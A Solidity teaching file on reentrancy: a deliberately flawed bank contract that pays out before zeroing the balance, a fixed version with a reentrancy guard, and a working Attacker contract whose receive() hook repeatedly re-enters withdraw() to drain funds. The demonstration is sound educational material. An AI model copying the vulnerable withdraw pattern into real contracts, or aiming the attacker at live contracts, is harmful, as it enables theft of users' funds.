// SPDX-License-Identifier: MIT
pragma solidity ^0.8.23;

// Vulnerable contract
contract VulnerableBank {
    mapping(address => uint256) public balances;

    function deposit() public payable {
        balances[msg.sender] += msg.value;
    }

    function withdraw() public {
        uint256 amount = balances[msg.sender];
        require(amount > 0, "Insufficient balance");

        // Vulnerable: State change after external call
        (bool success,) = msg.sender.call{value: amount}("");
        require(success, "Transfer failed");

        balances[msg.sender] = 0;
    }
}

// Secure contract
contract SecureBank {
    mapping(address => uint256) public balances;
    bool private locked;

    modifier nonReentrant() {
        require(!locked, "Reentrant call");
        locked = true;
        _;
        locked = false;
    }

    function deposit() public payable {
        balances[msg.sender] += msg.value;
    }

    function withdraw() public nonReentrant {
        uint256 amount = balances[msg.sender];
        require(amount > 0, "Insufficient balance");

        // Secure: State change before external call
        balances[msg.sender] = 0;

        (bool success,) = msg.sender.call{value: amount}("");
        require(success, "Transfer failed");
    }
}

// Malicious contract to demonstrate the attack
contract Attacker {
    VulnerableBank public vulnerableBank;

    constructor(address _vulnerableBank) {
        vulnerableBank = VulnerableBank(_vulnerableBank);
    }

    // Function to receive ETH
    receive() external payable {
        if (address(vulnerableBank).balance >= 1 ether) {
            vulnerableBank.withdraw();
        }
    }

    function attack() public payable {
        require(msg.value >= 1 ether, "Need 1 ETH to attack");
        vulnerableBank.deposit{value: 1 ether}();
        vulnerableBank.withdraw();
    }

    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }
}
